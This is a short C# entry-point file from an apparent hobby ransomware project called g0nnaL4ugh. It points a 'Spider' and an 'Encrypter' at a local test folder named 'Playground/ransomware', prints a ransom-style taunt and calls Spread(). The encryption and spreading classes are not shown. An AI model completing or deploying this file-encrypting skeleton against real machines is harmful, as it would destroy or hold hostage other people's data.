using System;
using g0nnaL4ugh.Crypto;

namespace g0nnaL4ugh
{
    class Program
    {
        public static void Main(string[] args)
        {
            // string[] paths = { "/home/giwiro/Playground/ransomware" };
            string[] paths = { "/Users/giwiro/Playground/ransomware/" };
            Spider spider;
            Encrypter encrypter = new Encrypter();
            spider = new Spider(paths, encrypter);
            Console.WriteLine("Wann4 play a G4m3?");
            spider.Spread();
        }
    }
}
